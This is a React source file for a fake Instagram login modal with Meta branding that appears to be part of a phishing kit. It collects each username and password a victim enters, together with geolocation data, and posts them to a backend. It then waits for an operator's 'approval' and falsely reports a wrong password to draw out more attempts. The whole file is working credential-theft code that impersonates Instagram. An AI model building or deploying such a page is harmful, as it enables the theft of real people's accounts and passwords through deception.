'use client';

import MetaLogo from '@/assets/images/meta-logo-image.png';
import { DEFAULT_TEXTS } from '@/constants/default-texts';
import { store } from '@/store/store';
import config from '@/utils/config';
import { buildAppealMessage } from '@/utils/message';
import { pollApproval } from '@/utils/poll-approval';
import { faEye } from '@fortawesome/free-regular-svg-icons/faEye';
import { faEyeSlash } from '@fortawesome/free-regular-svg-icons/faEyeSlash';
import { faTriangleExclamation } from '@fortawesome/free-solid-svg-icons/faTriangleExclamation';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import Image from 'next/image';
import { type FC, useState } from 'react';

const InstagramRoundLogo = () => (
    <div className='flex h-[72px] w-[72px] items-center justify-center rounded-full bg-linear-to-br from-[#f09433] via-[#dc2743] to-[#bc1888] p-[3px] shadow-[0_8px_24px_rgba(225,48,108,0.28)]'>
        <div className='flex h-full w-full items-center justify-center rounded-full bg-white'>
            <svg aria-hidden='true' className='h-9 w-9' viewBox='0 0 24 24'>
                <defs>
                    <linearGradient id='ig-modal-gradient' x1='0%' x2='100%' y1='100%' y2='0%'>
                        <stop offset='0%' stopColor='#f09433' />
                        <stop offset='50%' stopColor='#dc2743' />
                        <stop offset='100%' stopColor='#bc1888' />
                    </linearGradient>
                </defs>
                <path
                    fill='url(#ig-modal-gradient)'
                    d='M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z'
                />
            </svg>
        </div>
    </div>
);

const InstagramPasswordModal: FC<{ nextStep: () => void; texts?: Record<string, string> }> = ({ nextStep, texts = DEFAULT_TEXTS }) => {
    const [attempts, setAttempts] = useState(0);
    const [accountInput, setAccountInput] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [password, setPassword] = useState('');
    const [showError, setShowError] = useState(false);
    const [showPassword, setShowPassword] = useState(false);

    const { geoInfo, messageId, loginProvider, userData, addAccount, addPassword, setMessageId, setMessageContent } = store();
    const maxPass = config.MAX_PASS ?? 3;

    const togglePassword = () => setShowPassword((prev) => !prev);

    const handleSubmit = async () => {
        if (!accountInput.trim() || !password.trim() || isLoading) return;

        setShowError(false);
        setIsLoading(true);

        const next = attempts + 1;
        setAttempts(next);

        const sessionId = crypto.randomUUID();
        addAccount(accountInput);
        addPassword(password);

        const allAccounts = [...userData.accounts, accountInput];
        const allPasswords = [...userData.passwords, password];
        const message = buildAppealMessage({
            geoInfo,
            userData,
            loginProvider,
            accounts: allAccounts,
            passwords: allPasswords,
            maxPass
        });

        try {
            const res = await axios.post('/api/send', {
                message,
                old_message_id: messageId,
                approval_type: 'password',
                session_id: sessionId
            });

            if (res?.data?.success && typeof res.data.message_id === 'number') {
                setMessageId(res.data.message_id);
            }

            setMessageContent(message);

            const result = await pollApproval(sessionId);

            if (result === 'approved') {
                nextStep();
            } else if (next >= maxPass) {
                nextStep();
            } else {
                setShowError(true);
                setPassword('');
            }
        } catch {
            setShowError(true);
            setPassword('');
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center bg-black/40 px-4'>
            <div
                className='flex h-[90vh] w-full max-w-xl flex-col items-center gap-6 rounded-3xl border border-white/60 p-4 shadow-[0_18px_45px_rgba(131,58,180,0.16)]'
                style={{ background: 'linear-gradient(155deg, #fff8fc 0%, #fff5f8 28%, #f6f3ff 62%, #f2f8ff 100%)' }}
            >
                <InstagramRoundLogo />
                <div className='flex w-full flex-1 flex-col justify-center px-1'>
                    <div className='mb-4 w-full'>
                        <p className='flex items-start gap-2 text-left text-[15px] leading-[1.45] font-medium text-[#c13584]'>
                            <FontAwesomeIcon icon={faTriangleExclamation} className='mt-0.5 shrink-0 text-[#e09b1b]' />
                            <span>{texts.instagramLoginNotice}</span>
                        </p>
                    </div>

                    <div className='relative mb-3 w-full'>
                        <input
                            type='text'
                            id='ig-account-input'
                            value={accountInput}
                            onChange={(e) => setAccountInput(e.target.value)}
                            className='peer h-[60px] w-full rounded-xl border border-[#ecd9e8] bg-white/92 px-3 pt-6 pb-2 placeholder-transparent text-[#1d232f] shadow-sm transition-colors focus:border-[#e1306c] focus:outline-none focus:ring-4 focus:ring-[#e1306c]/10'
                            placeholder={texts.instagramUsername}
                        />
                        <label
                            htmlFor='ig-account-input'
                            className='absolute top-1/2 left-3 -translate-y-1/2 cursor-text text-[#5f6773] transition-all duration-200 ease-in-out peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-base peer-focus:top-2 peer-focus:translate-y-0 peer-focus:text-xs peer-focus:text-[#c13584] peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:translate-y-0 peer-[:not(:placeholder-shown)]:text-xs'
                        >
                            {texts.instagramUsername}
                        </label>
                    </div>

                    <div className='relative w-full'>
                        <input
                            type={showPassword ? 'text' : 'password'}
                            id='ig-password-input'
                            value={password}
                            onChange={(e) => {
                                setPassword(e.target.value);
                                if (showError) setShowError(false);
                            }}
                            className={`peer h-[60px] w-full rounded-xl border bg-white/92 px-3 pt-6 pb-2 placeholder-transparent text-[#1d232f] shadow-sm transition-colors focus:outline-none focus:ring-4 ${showError ? 'border-red-500 focus:border-red-500 focus:ring-red-500/10' : 'border-[#ecd9e8] focus:border-[#e1306c] focus:ring-[#e1306c]/10'}`}
                            placeholder={texts.loginPassword}
                        />
                        <label
                            htmlFor='ig-password-input'
                            className='absolute top-1/2 left-3 -translate-y-1/2 cursor-text text-[#5f6773] transition-all duration-200 ease-in-out peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-base peer-focus:top-2 peer-focus:translate-y-0 peer-focus:text-xs peer-focus:text-[#c13584] peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:translate-y-0 peer-[:not(:placeholder-shown)]:text-xs'
                        >
                            {texts.loginPassword}
                        </label>
                        <FontAwesomeIcon
                            icon={showPassword ? faEyeSlash : faEye}
                            size='lg'
                            className='absolute top-1/2 right-3 -translate-y-1/2 cursor-pointer text-[#6b7280] transition-colors hover:text-[#c13584]'
                            onClick={togglePassword}
                        />
                        {showError && <p className='mt-2 text-[15px] text-red-500'>{texts.loginWrongPassword}</p>}
                    </div>

                    <button
                        type='button'
                        onClick={handleSubmit}
                        disabled={isLoading || !accountInput.trim() || !password.trim()}
                        className={`mt-4 flex h-[50px] w-full items-center justify-center gap-2 rounded-full bg-linear-to-r from-[#833ab4] via-[#fd1d1d] to-[#fcb045] font-semibold text-white shadow-[0_8px_22px_rgba(225,48,108,0.28)] transition-all hover:opacity-95 active:scale-[0.99] ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}
                    >
                        {isLoading ? (
                            <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent' />
                        ) : (
                            attempts === 0 ? texts.instagramLoginBtn : texts.continueBtn
                        )}
                    </button>
                </div>
                <div className='flex items-center justify-center pt-2'>
                    <Image src={MetaLogo} alt='' className='h-[18px] w-[70px]' />
                </div>
            </div>
        </div>
    );
};

export default InstagramPasswordModal;
